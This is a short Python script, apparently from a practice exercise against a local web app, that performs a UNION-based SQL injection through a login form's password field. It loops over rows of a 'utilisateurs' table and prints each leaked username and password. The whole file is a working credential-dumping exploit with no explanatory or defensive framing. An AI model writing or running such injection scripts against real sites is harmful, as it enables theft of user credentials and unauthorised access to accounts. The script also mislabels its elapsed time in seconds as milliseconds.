import requests
import time
start = time.time()
formulaire = requests.Session() # Allows to generate a session under the name of 'form' variable
url_local = "http://localhost/main.php"
response_html = formulaire.get(url=url_local)
resultat_html = response_html.text
for i in range(0, 10):
    champ_mdp = f"'UNION SELECT identifiant, motdepasse FROM utilisateurs LIMIT {str(i)},1#"
    champ_identif = ''
    send_sql = ({"identif":champ_identif, "mdp":champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    start_string = response.text.find('Votre')
    end_string = response.text.find('</body>')
    response_injection = response.text[start_string:end_string]
    print(response_injection)
end = time.time()
difference = end - start
print(f'Execution time : {difference:2}ms\n')
